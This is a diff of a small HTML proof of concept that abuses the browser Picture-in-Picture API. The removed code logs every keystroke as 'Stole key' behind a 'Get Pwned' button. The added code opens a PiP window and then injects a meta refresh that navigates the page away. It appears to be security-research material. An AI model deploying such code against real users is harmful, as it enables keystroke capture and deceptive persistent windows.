@@ -1,117 +1,61 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <title>PiP + Meta Refresh PoC</title>
+
+  <style>
+    #contents {
+      width: 600px;
+      font: 14px "Open Sans", sans-serif;
+    }
+
+    :picture-in-picture {
+      box-shadow: 0 0 0 5px red;
+    }
+  </style>
+</head>
+
+<body>
+  <div id="contents">
+    <p>Click the button below</p>
+
+    <video id="video" src="v4.mp4" muted autoplay style="display:none"></video>
+
+    <div id="controlbar"></div>
+  </div>
 
 <script>
+let video;
 
+window.addEventListener("load", () => {
+  video = document.getElementById("video");
 
-window.addEventListener("load", startup, false);
-
-let count = 1;
-
-document.addEventListener("keydown", function(event) {
-	count += 1
-	console.log("Stole key", event.key)
-	elem = document.getElementById("video")
-	elem.src = `/assets/v${count}.mp4`
+  if (document.pictureInPictureEnabled) {
+    const btn = document.createElement("button");
+    btn.textContent = "Click Me";
+    btn.onclick = startExploit;
+    document.getElementById("controlbar").appendChild(btn);
+  }
 });
 
-let video;
-let logs;
-
-function startup() {
-	video = document.getElementById("video");
-	logs = document.getElementById("logs");
-
-	if (document.pictureInPictureEnabled) {
-
-		document
-			.querySelector(".no-picture-in-picture")
-			.remove();
-
-		const togglePipButton = document.createElement("button");
-		togglePipButton.textContent = "Get Pwned";
-		togglePipButton.addEventListener("click", togglePictureInPicture, false);
-		togglePictureInPicture();
-
-		document
-			.getElementById("controlbar")
-			.appendChild(togglePipButton);
-	}
-}
-
-function togglePictureInPicture() {
-	if (document.pictureInPictureElement) {
-		document.exitPictureInPicture();
-	} else {
-		if (document.pictureInPictureEnabled) {
-			video.requestPictureInPicture({
+function startExploit() {
+  video.requestPictureInPicture({
     width: 257,
     height: 340,
     disallowReturnToOpener: true,
-  })
-				.then(pictureInPictureWindow => {
-					pictureInPictureWindow.addEventListener("resize", onPictureInPictureResize, false);
-				});
-		}
-	}
+  }).then(() => {
+
+    // Inject meta refresh AFTER PiP is opened
+    setTimeout(() => {
+      const meta = document.createElement("meta");
+      meta.httpEquiv = "refresh";
+      meta.content = "0;url=https://example.com";
+      document.head.appendChild(meta);
+    }, 1000);
+
+  });
 }
-
-function onPictureInPictureResize() {
-	const listItem = document.createElement("li");
-	listItem.textContent = `resize - ${Date.now()}`;
-
-	logs.appendChild(listItem);
-	setTimeout(() => logs.removeChild(listItem), 2000);
-};
-
 </script>
 
-
-<style>
-#contents {
-  width: 600px;
-  font:
-    14px "Open Sans",
-    sans-serif;
-}
-
-#credits {
-  padding: 0 0 10px 0;
-  font:
-    italic 10px "Open Sans",
-    sans-serif;
-}
-
-:picture-in-picture {
-  box-shadow: 0 0 0 5px red;
-}
-</style>
-
-
-
-
-
-
-
-<!doctype html>
-<html lang="en">
-  <head>
-    <title>Picture-in-Picture Example</title>
-    <script src="main.js"></script>
-    <link href="main.css" rel="stylesheet">
-  </head>
-  <body>
-    <div id="contents">
-      <p>Quick demo of poc</p>
-		Password is logged to console
-			<video style="display: none" src="v4.mp4" id="video" muted autoplay width="300"></video>
-
-
-      <div id="controlbar">
-				<p class="no-picture-in-picture">
-					Picture-in-Picture mode not available
-				<p>
-      </div>
-
-      <ul id="logs"></ul>
-    </div>
-  </body>
+</body>
 </html>
